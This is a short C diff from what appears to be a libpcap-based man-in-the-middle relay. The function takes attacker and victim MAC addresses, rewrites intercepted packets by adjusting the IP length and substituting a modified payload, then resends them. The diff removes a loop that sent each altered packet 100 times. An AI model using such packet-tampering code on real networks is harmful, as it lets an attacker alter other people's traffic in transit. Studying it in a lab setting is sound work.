@@ -113,11 +113,6 @@ int relay(const char *dev, pcap_t *pcap, u_int8_t *attacker_mac, u_int8_t *victi
                         fix_len(&((ip_hdr *)(packet + 14))->ip_len, htons(0x0205));
                         printf("new : %d\n", ((ip_hdr *)(packet + 14))->ip_len);
                         copy_payload(modify, (char *)(packet + 14 + 4 * ippkt->ip_hl + 4 * tcppkt->tcp_offset));
-
-                        for (int i = 0; i < 100; i++)
-                        {
-                            pcap_sendpacket(pcap, (u_char *)packet, header->len);
-                        }
                     }
                 }
                 int res = pcap_sendpacket(pcap, (u_char *)packet, header->len);
